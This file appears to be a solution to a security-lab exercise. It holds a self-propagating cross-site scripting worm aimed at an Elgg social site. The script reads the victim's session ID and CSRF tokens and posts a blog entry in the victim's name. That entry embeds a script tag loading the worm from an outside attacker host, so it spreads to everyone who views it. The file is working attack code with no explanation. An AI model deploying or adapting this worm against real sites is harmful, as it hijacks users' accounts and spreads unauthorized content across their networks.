// <script src="http://www.xsslabattacker.com/xss_worm_blog.js"></script>


window.onload = function(){
			var title="&title=Hi from alice&excerpt=&description=Hey!!\n" + "<" + "script type=\"text/javascript\" src=\"http://www.xsslabattacker.com/xss_worm_blog.js\">" + "</" + "script>"+ "&tags=&comments_on=On&access_id=2&status=published&guid=&container_guid="+elgg.session.user.guid+"&save=Save";
			var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
			var token="&__elgg_token="+elgg.security.token.__elgg_token;
			var content=token + ts + title; 
			var sendurl="http://www.xsslabelgg.com/action/blog/save";
			if(elgg.session.user.guid!=47){
				var Ajax=null;
				Ajax=new XMLHttpRequest();
				Ajax.open("POST",sendurl,true);
				Ajax.setRequestHeader("Host","www.xsslabelgg.com");
				Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				Ajax.send(content);
			}
			
	}